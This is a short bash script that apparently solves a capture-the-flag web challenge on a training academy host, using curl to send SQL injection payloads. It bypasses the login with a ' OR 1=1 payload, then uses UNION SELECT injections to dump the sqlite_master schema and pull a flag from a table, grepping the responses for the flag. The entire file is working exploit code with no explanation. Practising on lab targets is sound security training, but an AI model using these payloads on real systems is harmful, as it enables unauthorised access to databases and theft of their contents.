#!/bin/bash
B="http://chatelaine.cylabacademy.net:25024"
curl -s -m 20 -c /tmp/cj7.txt -o /dev/null \
  --data-urlencode "username=a" --data-urlencode "password=' OR 1=1 LIMIT 1-- " "$B/"
echo "=== schema sqlite_master ==="
curl -s -m 20 -b /tmp/cj7.txt \
  --data-urlencode "search=' UNION SELECT sql,null,null FROM sqlite_master;--" \
  --data-urlencode "submit=Search" "$B/welcome.php" | grep -oE "<tr><td>[^<]*</td><td>[^<]*</td><td>[^<]*</td></tr>" | head -20
echo
echo "=== tentative directe more_table ==="
curl -s -m 20 -b /tmp/cj7.txt \
  --data-urlencode "search=' UNION SELECT flag,null,null FROM more_table;--" \
  --data-urlencode "submit=Search" "$B/welcome.php" | grep -oE "academy\{[^}]*\}|<tr><td>[^<]*</td>" | head -10
